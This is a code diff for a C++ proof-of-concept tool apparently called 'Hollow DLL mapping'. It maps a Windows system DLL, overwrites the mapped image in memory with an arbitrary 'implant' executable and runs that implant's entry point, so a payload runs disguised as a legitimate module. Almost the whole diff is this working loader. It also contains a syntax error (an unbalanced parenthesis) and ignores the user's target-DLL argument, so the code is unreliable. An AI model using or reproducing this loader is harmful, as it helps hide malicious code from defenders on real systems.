@@ -78,6 +78,7 @@ bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
 	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) return false;
 
 	memcpy(mapped, implant_dll, implant_size);
+	is_ok = true;
 	/*
 	SIZE_T number_written = 0;
 	if (WriteProcessMemory(hProcess, (LPVOID)mapped, implant_dll, implant_size, &number_written)) {
@@ -88,46 +89,99 @@ bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
 	return is_ok;
 }
 
+bool is_compatibile(BYTE *implant_dll)
+{
+	bool is_payload64 = peconv::is64bit(implant_dll);
+#ifdef _WIN64
+	if (!is_payload64)) {
+	std::cerr << "For 64 bit loader you MUST use a 64 bit payload!\n";
+	return false;
+	}
+#else
+	if (is_payload64) {
+		std::cerr << "For 32 bit loader you MUST use a 32 bit payload!\n";
+		return false;
+	}
+#endif
+	return true;
+}
+
 int main(int argc, char *argv[])
 {
-	/*if (argc < 3) {
-		std::cerr << "Supply the files!\n<target_dll> <payload_dll>" << std::endl;
+	if (argc < 2) {
+		std::cout << 
+			"\/***************************************************************************\n"
+			"Hollow DLL mapping (PoC)\nmore info: https://github.com/hasherezade/hollowed_dll_mapping\n"
+			"Args: <payload_dll> [target_dll]\n"
+			"\t<payload_dll> - the DLL that will be impanted\n"
+			"\t[target_dll] - the DLL that will be replaced (default: tapi32.dll)\n"
+			"***************************************************************************/\n"
+			<< std::endl;
 		system("pause");
-		return -1;
-	}*/
-	const char* dll_name = "C:\\Windows\\SysWOW64\\tapi32.dll"; //argv[1];
-	const char* implant_name = "demo.bin"; //argv[2];
+		return 0;
+	}
 
-	bool is_ok = true;
+	char target_dll[MAX_PATH] = { 0 };
+	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\tapi32.dll", target_dll, MAX_PATH);
 
-	PVOID mapped = map_dll_image(dll_name);
+	const char* dll_name = target_dll;
+	if (argc > 2) {
+		dll_name = argv[2];
+	}
+
+	const char* implant_name = argv[1];
+
+	std::cout << "target_dll: " << dll_name << "\n";
+	std::cout << "implant_dll: " << implant_name << "\n";
+
+	PVOID mapped = map_dll_image(target_dll);
 	if (!mapped) {
 		system("pause");
 		return -1;
 	}
+	std::cerr << "[*] Loading the implant...\n";
 	size_t v_size = 0;
 	BYTE* implant_dll = peconv::load_pe_executable(implant_name, v_size);
 	if (!implant_dll) {
-		std::cerr << "Failed to load the implant!\n";
+		std::cerr << "[-] Failed to load the implant!\n";
+		system("pause");
+		return -1;
+	}
+	std::cerr << "[+] Implant loaded\n";
+	if (!is_compatibile(implant_dll)) {
 		system("pause");
 		return -1;
 	}
 
 	//relocate the module to the target base:
-	peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll);
-
+	if (!peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll)) {
+		std::cerr << "[-] Failed to relocate the implant!\n";
+		system("pause");
+		return -1;
+	}
+	std::cout << "[*] Trying to overwrite the mapped DLL with the implant!\n";
 	if (overwrite_mapping(mapped, implant_dll, v_size)) {
-		std::cout << "Copied!\n";
+		std::cout << "[+] Copied!\n";
 	}
 	DWORD ep = peconv::get_entry_point_rva(implant_dll);
+	bool is_dll = peconv::is_module_dll(implant_dll);
 
 	peconv::free_pe_buffer(implant_dll); implant_dll = NULL;
 
-	BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))((ULONG_PTR)mapped + ep);
+	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep;
 
-	std::cout << "Executing Implant's Entry Point: " << std::hex << dll_main << "\n";
-	dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
+	std::cout << "[*] Executing Implant's Entry Point: " << std::hex << implant_ep << "\n";
+	if (is_dll) {
+		//run the implant as a DLL:
+		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
+		dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
+	}
+	else {
+		//run the implant as EXE:
+		BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
+		exe_main();
+	}
 
 	system("pause");
-	return is_ok ? 0 : -1;
+	return 0;
 }
